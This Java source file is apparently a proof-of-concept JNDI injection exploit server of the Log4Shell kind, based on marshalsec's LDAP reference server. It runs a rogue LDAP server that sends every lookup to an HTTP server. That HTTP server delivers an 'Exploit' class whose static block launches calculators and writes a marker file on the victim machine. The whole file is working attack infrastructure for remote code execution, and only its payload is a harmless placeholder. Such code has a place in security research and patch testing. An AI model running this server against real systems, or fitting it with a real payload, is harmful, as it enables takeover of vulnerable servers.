import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.URL;
import java.util.Base64;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

public class App {
    private static int ldapPort;
    private static int httpPort;
    private static String host;

    public static void main(String[] args) {
        String ldapPortStr = System.getenv("LDAP_PORT");
        if (ldapPortStr == null) ldapPortStr = "1389";
        ldapPort = Integer.parseInt(ldapPortStr);

        String httpPortStr = System.getenv("HTTP_PORT");
        if (httpPortStr == null) httpPortStr = "3000";
        httpPort = Integer.parseInt(httpPortStr);

        host = System.getenv("HOST");
        if (host == null) host = "localhost";
        try {
            startLdapServer();
            startHttpServer();

        } catch (Exception err) {
            err.printStackTrace();
        }
    }

    // The following the methods are based on
    // https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java,
    // which is licensed under MIT.
    static void startLdapServer() throws Exception {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=evil,dc=com");
        config.setListenerConfigs(new InMemoryListenerConfig(
            "listen",
            InetAddress.getByName("0.0.0.0"),
            ldapPort,
            ServerSocketFactory.getDefault(),
            SocketFactory.getDefault(),
            (SSLSocketFactory) SSLSocketFactory.getDefault()
        ));
        config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
            @Override
            public void processSearchResult(InMemoryInterceptedSearchResult result) {
                handleLdapRequest(result);
            }
        });
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Listening on ldap://" + host + ":" + ldapPort);
        ds.startListening();
    }

    static void handleLdapRequest(InMemoryInterceptedSearchResult result) {
        System.out.println("Got ldap request");
        Entry e = new Entry(result.getRequest().getBaseDN());
        e.addAttribute("javaClassName", "Exploit");
        try {
            String codebase = "http://" + host + ":" + httpPort + "/";
            String className = "Exploit";
            e.addAttribute("javaCodeBase", codebase);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", className);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            System.out.println("Served ldap response, refering to class " + className + " at " + codebase);
        } catch (Exception err) {
            err.printStackTrace();
        }
    }

    static void startHttpServer() throws Exception {
        byte[] exploit = loadExploitBytes();

        HttpServer httpServer = HttpServer.create(new InetSocketAddress(httpPort), 0);
        httpServer.createContext("/", new HttpHandler() {
            @Override
            public void handle(HttpExchange exchange) throws IOException {
                handleHttpRequest(exchange, exploit);
            }
        });
        httpServer.setExecutor(null);
        httpServer.start();
        System.out.println("Listening on http://" + host + ":" + httpPort);
    }

    static byte[] loadExploitBytes() throws IOException {
        String name = Exploit.class.getName().replace(".", "/") + ".class";
        URL res = Exploit.class
            .getClassLoader()
            .getResource(name);
        int length = res.openConnection().getContentLength();
        byte[] exploit = new byte[length];
        if (Exploit.class
            .getClassLoader()
            .getResourceAsStream(name)
            .read(exploit) != length) {
            throw new IOException("Could not all bytes of the Exploit class");
        }
        return exploit;
    }

    static void handleHttpRequest(HttpExchange exchange, byte[] exploit) throws IOException {
        System.out.println("Got http request");

        exchange.sendResponseHeaders(200, exploit.length);
        OutputStream body = exchange.getResponseBody();
        body.write(exploit);
        body.close();
        System.out.println("Served http response");
    }
}

class Exploit {
    static {
        for (String cmd : new String[] { "calc.exe", "gnome-calculator", "touch if_this_exists_you_got_owned" }) {
            try {
                Process process = Runtime.getRuntime().exec(cmd);
            } catch (Exception e) {}
        }
    }
}
